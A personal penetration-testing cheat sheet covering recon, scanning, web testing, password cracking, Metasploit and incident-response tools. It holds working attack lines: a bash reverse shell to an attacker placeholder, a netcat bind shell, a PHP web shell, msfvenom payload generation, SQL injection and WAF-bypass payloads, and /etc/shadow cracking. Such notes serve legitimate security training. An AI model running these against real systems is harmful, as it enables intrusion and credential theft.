# PENTEST CHEAT SHEET 

---

> Personal working reference, built up from notes. Not comprehensive.

## Recon & Enumeration

### Pre-requisites / Info Gathering

- [ ] Run `whoami` (and `id`) to confirm the current user context and privilege level before doing anything else.
- [ ] Check what machine/environment this actually is (`hostname`, `uname -a`), don't assume.
- [ ] Identify the OS and version, then research known vulnerabilities/exploits for that specific version.
- [ ] Determine how the machine is connected (network interfaces, VPN, internal vs external): `ip a` / `ifconfig`, check routing.
- [ ] Look for suspicious files (unusual permissions, hidden files, recently modified files) as an early red flag / lead.
- [ ] Keep the CIA triad (Confidentiality, Integrity, Availability) in mind when assessing impact of any finding.
- [ ] Mindset: ask questions, test unexpected/edge-case inputs, look for ways to chain small weaknesses into a bigger issue, and think like an adversary throughout.

### Searching

- [ ] Search Shodan for the target (useful for IoT/internet-facing devices):
  - [ ] Check response headers for service/version info.
  - [ ] Cross-reference any identified service/version against known CVEs.
  - [ ] Note the country the host is registered/hosted in.
  - [ ] Note open ports.
  - [ ] Note the owning organisation.
  - [ ] Note the hostname.
- [ ] Check files/hashes against VirusTotal.
- [ ] Look up findings in the NIST CVE database (nvd.nist.gov):
  - [ ] Review the impact score/metrics.
  - [ ] Review the attack complexity.
  - [ ] Review effect on availability.
  - [ ] Read the full vulnerability details, don't just rely on the score.
- [ ] Check the vendor's product/tool documentation for configuration details and known issues.
- [ ] Check GitHub for the product/tool:
  - [ ] Review latest commits for recently patched issues (can hint at what was vulnerable).
  - [ ] Search for proof-of-concept (PoC) code.
  - [ ] Search for existing exploit tools/scripts.
  - [ ] Search for write-ups/reports referencing the product.

### Static Analysis

- [ ] `cat -A [file]`, show non-printing characters (line endings, tabs, etc.), useful for spotting hidden control characters or mismatched line endings (CRLF vs LF).
- [ ] `xxd [file]` or `hexdump -C [file]`, dump the raw hex/ASCII view of a file to inspect magic bytes, embedded binary data, or hidden payloads not visible as plain text.
- [ ] `wc -c [file]`, get the exact byte count and compare to the expected file size, a mismatch can indicate appended/hidden data (e.g. steganography, trailing payloads).
- [ ] `ls -la [file]`, check permissions, ownership, and timestamps, look for anything overly permissive (e.g. world-writable) or timestamps inconsistent with when the file should have been created/modified.
- [ ] `strings [file]`, extract printable strings from a binary/file, quick way to spot embedded URLs, credentials, paths, or other readable artifacts.
- [ ] `grep -P '[^\x00-\x7F]' [file]`, search for non-ASCII bytes, helps flag unicode tricks, obfuscation, or non-printable characters hidden in an otherwise normal-looking file.

### Further Recon (PowerShell)

- [ ] `Get-NetTCPConnection`, list active TCP connections and their states/owning processes (PowerShell equivalent of `netstat`), useful for spotting unexpected outbound connections or listening ports.
- [ ] Check for backdoors, look for unexpected scheduled tasks, services, startup items, or listening processes that shouldn't be there.
- [ ] Look for signs of attacker control, unfamiliar accounts, unexpected remote sessions, or processes running under unusual privilege contexts.
- [ ] `Get-FileHash`, hash a file (SHA256 by default) to compare against known-good/known-bad hash lists (e.g. VirusTotal, vendor checksums).
- [ ] `Invoke-Command`, run custom scripts or commands (locally or against remote hosts) for enumeration, useful for scripting repeatable recon checks across a host or set of hosts.

### Protocols & Port Numbers

| Protocol | Transport | Default Port |
|----------|-----------|---------------|
| Telnet   | TCP       | 23 |
| DNS      | UDP/TCP   | 53 |
| HTTP     | TCP       | 80 |
| FTP      | TCP       | 21 |
| SMTP     | TCP       | 25 |
| POP3     | TCP       | 110 |
| IMAP     | TCP       | 143 |

Secure variants:

| Protocol | Transport | Default Port |
|----------|-----------|---------------|
| HTTPS    | TCP       | 443 |
| SMTPS    | TCP       | 465 / 587 |
| POP3S    | TCP       | 995 |
| IMAPS    | TCP       | 993 |

### Wireshark OSI Mapping

| OSI Layer | Wireshark Field | What to Look For |
|-----------|-----------------|-------------------|
| Physical | Frame | Frame length, capture timestamp, interface metadata |
| Data Link | Ethernet II | Source/destination MAC address |
| Network | Internet Protocol (IP) | Source/destination IP address |
| Transport | TCP / UDP | Protocol type, ports, flags/protocol errors |
| Session | Protocol-specific state (e.g. TCP session state, TLS handshake) | Communication/session behaviour |
| Presentation / Application | Application layer protocol (HTTP, DNS, etc.) | Actual application data payload |

Note: real captures rarely show distinct Session/Presentation sections, most protocols fold these into the Application layer. This mapping is the simplified teaching version, useful as a mental model, not a literal Wireshark field-by-field guide.

### tcpdump

- [ ] `tcpdump host [ip]`, filter packets by a specific IP address or hostname.
- [ ] `tcpdump src host [ip]`, filter packets by a specific source host.
- [ ] `tcpdump dst host [ip]`, filter packets by a specific destination host.
- [ ] `tcpdump port [port#]`, filter packets by port number.
- [ ] `tcpdump [protocol]`, filter packets by protocol, e.g. `ip`, `ip6`, `icmp`.

### Nmap

- [ ] `nmap -sn [target/range]`, host discovery/ping sweep, use first to identify live hosts before running heavier scans.
- [ ] `nmap -sS [target]`, SYN ("half-open") scan, stealthier than a full TCP connect scan, requires root/admin.
- [ ] `nmap -sV [target]`, service/version detection, feed results into CVE lookups (see Searching section).
- [ ] `nmap -O [target]`, OS detection based on TCP/IP stack fingerprinting.
- [ ] `nmap -p- [target]`, scan the full port range (1-65535) rather than just the default top ports.
- [ ] `nmap --script=[script-name] [target]`, run NSE (Nmap Scripting Engine) scripts for vulnerability detection, default scripts, etc.
- [ ] Watch scan speed/timing: running at default or aggressive timing (`-T4`/`-T5`) can trigger an IDS. Use slower timing templates (`-T0`-`-T2`) or throttle scans when stealth matters.

### Vulnerability Scanning

- [ ] Authenticated vs unauthenticated:
  - [ ] Unauthenticated: scan without credentials, seeing only what's visible externally (open ports, banners, unpatched exposed services), e.g. an unauthenticated Nessus scan against a public web server.
  - [ ] Authenticated: scan using valid credentials (SSH/SMB/local admin) to inspect the system from the inside, e.g. an authenticated scan over SMB with domain credentials to check Windows patch levels and local misconfigurations.
- [ ] Internal vs external:
  - [ ] External: scan from outside the network perimeter, mimicking an internet-facing attacker, e.g. scanning a company's public IP range/DMZ.
  - [ ] Internal: scan from within the network (e.g. after gaining a foothold), testing for internal misconfigurations and lateral movement opportunities not exposed externally.

#### Scanners

- Nessus (Tenable): widely used scanner with a large plugin library, supports authenticated/unauthenticated scanning and compliance checks.
- Qualys: cloud-based vulnerability management platform, continuous scanning via agents/appliances.
- Nexpose (Rapid7): vulnerability management tool, integrates with Metasploit as part of the Rapid7 ecosystem.
- OpenVAS (Greenbone Vulnerability Management): free, open-source scanner, a common alternative to Nessus/Qualys, backed by a regularly updated feed of vulnerability tests (NVTs).

#### Using OpenVAS

- [ ] Access the Greenbone Security Assistant (GSA) web UI, typically `https://localhost:9392`.
- [ ] Create a Target: specify the IP/hostname(s) to scan.
- [ ] Create a Task: link the Target to a Scan Config (e.g. "Full and fast").
- [ ] For authenticated scanning, add credentials under Configuration > Credentials (SSH/SMB), then attach them to the Target.
- [ ] Start the Task and monitor progress.
- [ ] Review the report: findings are listed with CVSS score, description, and remediation guidance.
- [ ] Export the report (PDF/XML) for record-keeping or inclusion in a client deliverable.

## Web Application Testing

### Gobuster

Enumerating directories, DNS records, and virtual hosts by brute-forcing against a wordlist.

`dir` mode: enumerate website directories and their files.

- [ ] `-c`, cookie to pass on each request.
- [ ] `-x`, file extension(s) to search for.
- [ ] `-H`, custom header to add (`Header:Value`), can be used multiple times.
- [ ] `-k`, skip TLS certificate validation.
- [ ] `-n`, don't show status codes.
- [ ] `-P`, password for Basic Auth (use with `-U`).
- [ ] `-s`, allow-list of status codes to treat as valid.
- [ ] `-b`, blacklist status codes to exclude.
- [ ] `-U`, username for Basic Auth (use with `-P`).
- [ ] `-r`, follow redirects.

`dns` mode:

- [ ] `-c`, show CNAME records.
- [ ] `-i`, show IP addresses that the domain/subdomain resolves to.
- [ ] `-r`, custom DNS server/resolver to use (same letter as `dir` mode's follow-redirect flag, different meaning here).
- [ ] `-d`, the target domain to enumerate.

`vhost` mode:

- [ ] `-u`, base URL to target (lowercase, `-U` is username elsewhere in gobuster, easy to mix up).
- [ ] `-m`, HTTP method to use for probing.
- [ ] `--domain`, domain to append when the wordlist contains only vhost names rather than full domains.
- [ ] `-r`, follow redirects.

### Burp Suite

- Proxy: interception and modification of requests and responses between browser and target.
- Repeater: manual resending and tweaking of individual requests to observe server responses.
- Intruder: automated sending of modified requests, used for fuzzing, brute-forcing, parameter tampering.
- Decoder: encoding/decoding of data (Base64, URL, hex, etc.) and hash generation.
- Comparer: diffing two pieces of data (e.g. two requests/responses) to spot differences.
- Sequencer: analysis of token randomness/predictability (session IDs, CSRF tokens, etc.).

### SQL Injection

- [ ] SQLMap (automated): `sqlmap -u "http://[target]/page.php?id=1" --dbs`, enumerate databases via a vulnerable parameter.
- [ ] HTTP GET-based testing (manual): append an injection payload to a GET parameter and watch for SQL errors/behaviour changes, e.g. `http://[target]/page.php?id=1'`.
- [ ] Cookie-based testing (bypass auth redirects): test session cookies like `PHPSESSID`/`JSESSIONID` for injection, since the app may use them directly in a SQL lookup, e.g. `sqlmap -u "http://[target]/" --cookie="PHPSESSID=1" -p PHPSESSID`.

### Hydra

Login brute-forcing; attacking the service directly over the network, rather than cracking captured hashes offline (John/hashcat).

- [ ] `hydra -l [username] -P [wordlist] [target] [service]`, brute-force a single username against a wordlist for a given service, e.g. `hydra -l admin -P rockyou.txt 10.10.10.10 ssh`.
- [ ] `-L [userlist]`, use a list of usernames instead of a single one (combine with `-P` for full user x password brute-force).
- [ ] `-s [port]`, specify a non-default port for the target service.
- [ ] `-t [tasks]`, set the number of parallel connections/threads.
- [ ] `-f`, stop as soon as a valid credential pair is found.
- [ ] Supports many protocols/services: ssh, ftp, http-post-form, rdp, smb, and more.
- [ ] Caution: online brute-forcing can lock accounts or trigger IDS/lockout alerts, throttle attempts (`-t`) when stealth or account safety matters.

### Firewalls (WAF)

- [ ] `wafw00f [url]`, fingerprint whether a WAF is present and, if so, identify the vendor/product.
- [ ] Against a subnet/range rather than a single host, fall back to `nmap --script=http-waf-detect,http-waf-fingerprint [target/subnet]`, since `wafw00f` only targets one URL at a time.
- [ ] Encoding/double encoding to bypass a WAF: encode payload characters (e.g. URL-encode `'` as `%27`, or double-encode as `%2527`) so the WAF's pattern matching misses it while the backend still decodes and processes the payload as normal.

### OWASP: IAAA (Identification, Authentication, Authorisation, Accountability)

#### A01: Broken Access Control
- [ ] Test for IDOR (Insecure Direct Object Reference): manipulate object identifiers in requests (e.g. change `?id=123` to `?id=124`) and check whether access controls are actually enforced server-side, not just hidden client-side.

#### A07: Authentication Failures
- [ ] Test for auth bypass: forced browsing to authenticated pages, cookie/parameter manipulation, JWT tampering, or injection in the login form.
- [ ] Test MFA: check for missing rate limiting on OTP codes, response manipulation to skip the MFA step, or weak backup-code handling.
- [ ] Review the auth module/library in use: check its version against known CVEs (see Searching section) and its session management (token expiry, session fixation).

#### A09: Security Logging & Alerting Failures
- [ ] (no notes yet)

### OWASP: App Design & Supply Chain Flaws

#### A02: Security Misconfiguration
- [ ] Check for default credentials/configs left in place (default admin passwords, default sample apps/pages).
- [ ] Check for unnecessary endpoints/services exposed (unused API routes, debug endpoints, verbose error pages).
- [ ] Check for outdated software/components with known vulnerabilities (cross-ref Searching/CVE section).
- [ ] Check for exposed `/admin` (or similar) panels without adequate access control.

#### A03: Software Supply Chain Failures
- [ ] Check for unmaintained/abandoned libraries with no security patches.
- [ ] Check auto-update mechanisms for missing integrity/signature verification.
- [ ] Assess over-reliance on third-party services/components without vetting or fallback.
- [ ] Check CI/CD pipeline security: access controls, secret handling, unsigned/unverified build artifacts.

#### A04: Cryptographic Failures
- [ ] Check for deprecated/weak algorithms in use (see Insecure Password Practices > Outdated encryption for related notes).
- [ ] Check that sensitive data (passwords especially) uses an industry-standard function, bcrypt, scrypt, or Argon2, rather than a custom/proprietary scheme ("don't roll your own crypto").
- [ ] Check for hardcoded secrets/keys in source code or config.
- [ ] Check key rotation practices, are keys/certs rotated regularly or left static indefinitely.
- [ ] Check for missing encryption (data sent or stored in cleartext, in transit or at rest).

#### A05: Injection
- [ ] SQL injection (see SQL Injection section).
- [ ] Command injection: test for OS command injection via unsanitised input passed to system calls/shell execution.
- [ ] Prompt injection: test LLM-integrated features for injected instructions that override intended behaviour (see Insecure Design > missing LLM guardrails).
- [ ] Server-side template injection (SSTI): test template engines (e.g. Jinja2) for injected template syntax leading to code execution, e.g. a payload like `{{7*7}}` to confirm SSTI.

#### A06: Insecure Design
- [ ] Check for weak business logic (workflows that can be skipped/reordered to bypass intended checks).
- [ ] Check for flawed assumptions baked into the design (e.g. trusting client-side validation, assuming inputs are always well-formed).
- [ ] Check for missing guardrails around LLM/AI features (e.g. prompt injection, lack of output validation, excessive agency).

#### A08: Data Integrity and Confidentiality Failures
- [ ] Check whether software updates are trusted/applied without verifying integrity/signatures (see Software Supply Chain > auto-update mechanisms).
- [ ] Check that integrity verification (signing, provenance attestation) is baked into the CI/CD pipeline, not just access control (see Software Supply Chain section).
- [ ] Check for insecure deserialisation, e.g. Python's `pickle` module deserialising untrusted data can lead to arbitrary code execution, look for `pickle.loads()` on user-controlled input.

## Credential Attacks & Exploitation

### Insecure Password Practices

#### 1. Plaintext storage
- [ ] Check db dumps/backups for plaintext passwords (`grep -riE 'password|passwd|pwd' dump.sql`, or open the dump and search manually).
- [ ] Check config files and log files for plaintext credentials (`grep -riE 'password\s*=|passwd' /etc /var/log` or across the app's config directory).
- [ ] Check admin panels for exposed/visible credentials (view page source, inspect network requests/responses in browser dev tools).
- [ ] Check git history for committed plaintext passwords (`git log -p`, or tools like `trufflehog`/`git-secrets`).

#### 2. Outdated encryption
- [ ] Flag encryption used instead of hashing, regardless of algorithm strength, passwords should never be reversible.
- [ ] Watch for outdated/weak ciphers specifically: DES/3DES.
- [ ] Even AES is a red flag here, if it's decryptable at all, it's the wrong approach for password storage.

#### 3. Insecure hashing
- [ ] Flag MD5 or SHA-1 hashes found in a web app's database, both considered broken/weak for password storage.
- [ ] Flag unsalted SHA-256 hashes, vulnerable to rainbow table/dictionary attacks without a per-user salt.
- [ ] Use `rockyou.txt` (or similar wordlists) to test hash-cracking feasibility against any captured hashes.

#### What secure storage looks like (reference)

Use this to judge whether an implementation is doing it right, or as the basis for a remediation recommendation:

- [ ] Select a secure, purpose-built hashing function (e.g. bcrypt, scrypt, Argon2), not a general-purpose hash like MD5/SHA1/SHA256 used alone.
- [ ] Generate a unique, random salt per password (not reused across users).
- [ ] Concatenate the password with its salt before hashing.
- [ ] Calculate the hash of the combined (password + salt) value.
- [ ] Store both the resulting hash and the salt (salt does not need to be secret, it just needs to be unique).

### John the Ripper

- [ ] Dictionary attack: crack captured hashes using a wordlist, e.g. `john --wordlist=rockyou.txt [hashfile]`.
- [ ] Windows hashes: crack NTHash/NTLM hashes with the correct format flag, e.g. `john --format=nt --wordlist=rockyou.txt [hashfile]`.
- [ ] Unshadow (Linux password hashes):
  - [ ] Requires root access, `/etc/shadow` (where the actual hashes live) is only readable by root.
  - [ ] Combine `/etc/passwd` and `/etc/shadow` into one crackable file: `unshadow /etc/passwd /etc/shadow > combined.txt`.
  - [ ] Feed the combined output into John: `john combined.txt`.
- [ ] Single crack mode: faster, targeted attack, generates guesses from the username/GECOS info rather than a full wordlist.
  - [ ] Format input as `username:hash`.
  - [ ] Run with `john --single --format=[format] [file]`.
- [ ] Custom rules: define custom word-mangling rules (e.g. append numbers, leetspeak substitutions) to extend wordlist attacks, configured in `/etc/john/john.conf`.

### Metasploit

Exploiting already-confirmed vulnerabilities (e.g. a CVE matched during recon/Searching); not a first-line discovery tool. Also used for verified scanning via auxiliary modules and post-exploitation once access has been gained.

- [ ] Cross-reference the target's known vulnerabilities (CVEs) against available Metasploit modules before running anything.
- [ ] `msfconsole`, the primary CLI interface into the framework.
- [ ] Modules: the supporting code that does the actual work (exploits, scanners, payloads, etc.), see breakdown below.
- [ ] Tools: standalone utilities that ship with the framework and run independently of `msfconsole`.

#### Module directory structure

(`/opt/metasploit-framework/embedded/framework/modules`)

- [ ] `auxiliary`, non-exploit modules: scanning, fuzzing, enumeration, DoS, etc.
- [ ] `encoders`, encode payloads to avoid bad characters or basic detection.
- [ ] `evasion`, modules aimed specifically at bypassing AV/endpoint defences.
- [ ] `exploits`, the actual exploit code for specific vulnerabilities.
- [ ] `nops`, no-operation ("NOP sled") generators, used to pad buffers for exploit reliability.
- [ ] `payloads`, the code executed after successful exploitation:
  - [ ] `adapters`, adapt a payload to a specific execution format/context.
  - [ ] `singles`, self-contained payloads that don't need a separate stage.
  - [ ] `stagers`, small first-stage code that establishes a connection back, then fetches the full payload.
  - [ ] `stages`, the larger payload component downloaded and run by a stager.
- [ ] `post`, post-exploitation modules (privilege escalation, credential harvesting, pivoting, etc.).

#### Basic usage

- [ ] `use exploit [name]`, select an exploit module to work with.
- [ ] `setg [option] [value]`, set a variable globally so it persists across module changes (vs. `set`, which only applies to the current module).

### msfvenom

Generating standalone payloads; ties into the `payloads` directory covered under Metasploit.

- [ ] `msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] -o [output]`, generate a payload for a given target/format, e.g. `windows/meterpreter/reverse_tcp`.
- [ ] `-f [format]`, output format matched to the target platform (`exe`, `elf`, `apk`, `php`, `raw`, etc.).
- [ ] `-e [encoder] -i [iterations]`, apply an encoder to help evade basic signature-based detection.
- [ ] `-a [arch] --platform [platform]`, specify architecture/platform explicitly when it isn't inferred from the payload name.

### Shell Access

- [ ] Reverse shell (target connects back to attacker's listener):
  - [ ] Start a listener on the attacker machine: `nc -lvnp [port]`.
  - [ ] Trigger the payload on the target, e.g. `bash -i >& /dev/tcp/[attacker_ip]/[port] 0>&1`.
- [ ] Bind shell (target listens, attacker connects in):
  - [ ] Start a listener on the target: `nc -lvnp [port] -e /bin/sh`.
  - [ ] Connect to it from the attacker machine: `nc [target_ip] [port]`.
- [ ] Web shell (via an exploited file upload):
  - [ ] Upload a script the server will execute, e.g. `shell.php` containing `<?php system($_GET['cmd']); ?>`.
  - [ ] Trigger commands through the browser/`curl`: `curl "http://[target]/uploads/shell.php?cmd=id"`.

## Incident Response & Forensics

### Incident Response & Logs

- [ ] Splunk: centralised log aggregation/SIEM, search and correlate logs across systems using SPL (Search Processing Language).
- [ ] Windows Event Viewer: check Security, System, and Application logs; key event IDs: 4624/4625 (successful/failed logon), 4688 (process creation), 1102 (security log cleared).
- [ ] Linux logs (`/var/log/`): check `auth.log`/`secure` (authentication), `syslog`/`messages` (general system activity), and any service-specific logs relevant to the incident.
- [ ] Detecting `whoami` command execution on Linux (via auditd):
  - [ ] Confirm auditd is running: `systemctl status auditd`.
  - [ ] Add a watch rule on the binary: `auditctl -w /usr/bin/whoami -p x -k whoami_exec`.
  - [ ] Search triggered events: `ausearch -k whoami_exec`.
- [ ] Check whether event logs have been cleared:
  - [ ] Windows: look for Event ID 1102 (audit log cleared) or 104 (log service cleared).
  - [ ] Linux: look for gaps/truncation in log files, unexpected file sizes, or missing entries in `journalctl --list-boots`/`last`/`lastlog`.

### Static/Dynamic Analysis (Malware Analysis)

- CAPA: quick static triage of an unknown binary, identifies its capabilities (e.g. persistence, process injection) without needing to fully reverse engineer it.
- `oledump.py` (REMnux): analysing suspicious Office documents (OLE/Compound File format), e.g. extracting and inspecting embedded VBA macros from a phishing attachment.
- Volatility: memory forensics, analysing a RAM capture/memory dump to find running processes, injected code, or network connections during incident response.
- FlareVM (Windows): a pre-built Windows malware analysis VM, used as the base environment for reverse engineering Windows samples.
- inetsim: simulates internet services (DNS, HTTP, etc.) in an isolated lab, used during dynamic analysis so malware believes it has network access without any real connectivity.
- Ghidra: in-depth static analysis via disassembly/decompilation, used to understand a binary's logic when source code isn't available.
- x64dbg: Windows user-mode debugger, used for dynamic analysis, stepping through execution, setting breakpoints, inspecting registers/memory at runtime.
- Hopper: disassembler/decompiler similar to Ghidra, commonly used for macOS/Linux/iOS (Mach-O) binaries.

### Toolbox

#### Reverse Engineering

- Ghidra: NSA's free reverse engineering suite (disassembler/decompiler).
- x64dbg: Windows user-mode debugger for stepping through execution and inspecting runtime state.
- OllyDbg: older 32-bit Windows debugger, still used for manual malware analysis/unpacking.
- Radare2: open-source, scriptable reverse engineering framework (disassembler, debugger, binary analysis).
- Binary Ninja: commercial reverse engineering platform with disassembly, decompilation, and a scriptable API.
- PEiD: identifies packers/cryptors/compilers used to build a PE file, useful for quick triage before deeper analysis.

#### Disassemblers and Decompilers

- CFF Explorer: PE file editor/viewer, inspects and edits PE headers, sections, imports/exports.
- Hopper: disassembler/decompiler, commonly used for macOS/Linux/iOS (Mach-O) binaries.
- RetDec: open-source retargetable decompiler, converts binaries into readable pseudo-C code across multiple architectures.

#### Static and Dynamic Analysis

- Process Hacker: advanced task manager/process viewer, inspects processes, handles, memory, and network connections in more depth than Task Manager.
- PEview: simple PE file structure viewer, inspects headers/sections without editing.
- Dependency Walker: lists the DLL dependencies of a Windows executable.
- DIE (Detect It Easy): identifies file types, packers, and compilers via signatures.
- Autoruns: shows what's configured to run at startup/logon, useful for spotting persistence mechanisms.
- Process Explorer: advanced Task Manager replacement, shows detailed process trees, handles, and loaded DLLs.
- Process Monitor (Procmon): real-time monitoring of file system, registry, and process/thread activity, useful for observing exactly what a program does when run.

#### Forensics

- Volatility: memory forensics framework, analyses RAM captures/memory dumps.
- Rekall: another memory forensics framework (a fork of Volatility), used similarly.
- FTK Imager: creates forensic disk images and previews/exports files from an image without altering the original evidence.

#### Network Analysis

- Wireshark: packet capture/analysis (see Wireshark OSI Mapping section).
- Nmap: port/service scanning (see Nmap section).
- Netcat (nc): general-purpose networking utility for raw TCP/UDP traffic, used for banner grabbing, file transfer, or quick listeners/shells (see Shell Access section).

#### File Analysis

- FileInsight: hex editor/binary analysis tool (McAfee) with plugin/scripting support for parsing and decoding.
- HexFiend: open-source hex editor, handles large files well.
- HxD: free hex editor/disk editor for Windows.

#### Scripting and Automation

- Python: general-purpose scripting language, used for custom analysis/automation scripts (parsers, PoCs, repetitive task automation).
- PowerShell Empire: post-exploitation C2 framework built around PowerShell agents.
